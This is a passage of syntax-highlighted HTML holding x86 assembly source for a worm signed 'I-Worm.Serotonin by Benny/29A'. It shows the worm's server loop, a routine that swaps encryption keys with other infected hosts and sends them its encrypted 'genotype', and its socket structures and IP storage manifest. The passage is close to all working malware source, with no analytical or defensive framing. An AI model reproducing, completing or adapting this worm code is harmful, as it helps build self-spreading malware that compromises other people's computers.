    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptDestroyKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">socket_server_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;close connection</span><span class="sc0">
</span><span class="sc5">st_patch</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;instruction to patch...</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">server_loop</span><span class="sc0">         </span><span class="sc1">;...handle next client</span><span class="sc0">


    </span><span class="sc1">;CLEAN &amp; QUIT</span><span class="sc0">


</span><span class="sc5">socket_st_end</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">hSocket2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;close listening socket</span><span class="sc0">
</span><span class="sc5">wsa_st_end</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_WSACleanup</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;unitialize WSOCK32.dll</span><span class="sc0">
</span><span class="sc5">crypt_st_end</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptDestroyKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;destroy worm's public key</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cProvider</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptReleaseContext</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;unitialize CRYPT32.dll context</span><span class="sc0">
</span><span class="sc5">st_end</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all GP registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">






</span><span class="sc1">;send recieved genotype to another worm</span><span class="sc0">

</span><span class="sc5">genotype_broadcast</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;save crucial variables (socket, key handle)</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">protocol_MAGIC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDKEY</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">pubkey_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send public key</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response5</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">end_gb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDKEY</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_gb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_memory</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response</span><span class="sc0">            </span><span class="sc1">;recieve public key</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">import_key</span><span class="sc0">          </span><span class="sc1">;and import it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">st_gen_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_memory</span><span class="sc0">            </span><span class="sc1">;allocate memory for encrypted genotype</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_gb_key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_mem_genotype2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


    </span><span class="sc1">;encrypt genotype before sending</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_gen_size2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_mem_genotype</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">gb_crypt_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">gb_crypt_final</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">gb_crypt_final</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_encrypt</span><span class="sc0">           </span><span class="sc1">;encrypt one block</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_gen_size2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gb_crypt_loop</span><span class="sc0">

</span><span class="sc5">gb_crypt_final</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_encrypt_final</span><span class="sc0">     </span><span class="sc1">;encrypt final block</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">st_gen_size2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;ECX = size of encrypted genotype</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">protocol_MAGIC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDGENOTYPEONLY</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_mem_genotype2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send genotype</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">st_mem_genotype2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">

</span><span class="sc5">end_gb_key</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;close public key handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptDestroyKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">end_gb</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;restore public key handle</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;restore socket handle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">ServerThread</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc5">signature</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'I-Worm.Serotonin by Benny/29A'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">


</span><span class="sc5">socket</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;socket structure</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0C200h</span><span class="sc0">          </span><span class="sc1">;port (194)</span><span class="sc0">
</span><span class="sc5">socket_address</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;IP address</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sizeofsocket</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">socket</span><span class="sc0">


</span><span class="sc5">WSAData</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;WSAData structure</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">257</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">129</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0">     </span><span class="sc5">WSAData</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">procz</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">modz</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mod_name</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">p_token</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0">     </span><span class="sc5">WSAData</span><span class="sc0">


</span><span class="sc5">protocol_MAGIC</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">WORMNET_SENDKEY</span><span class="sc0">     </span><span class="sc1">;magic number</span><span class="sc0">
</span><span class="sc5">protocol_SIZE</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;size of data</span><span class="sc0">

</span><span class="sc5">public_key</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;maximal size of key</span><span class="sc0">
</span><span class="sc5">public_key_length</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">

</span><span class="sc5">tmp</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc1">;MANIFEST (GENOTYPE + IP storage):</span><span class="sc0">

</span><span class="sc5">MANIFEST</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">IPs</span><span class="sc4">-</span><span class="sc5">MANIFEST</span><span class="sc0">        </span><span class="sc1">;RVA of IP storage</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;number of IP entries</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genotype.inc</span><span class="sc0">                </span><span class="sc1">;include genotype file</span><span class="sc0">
</span><span class="sc5">IPs</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0100007Fh</span><span class="sc0">       </span><span class="sc1">;IP address</span><span class="sc0">


</span><span class="sc5">_virtual_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Start</span></div></body>
</html>
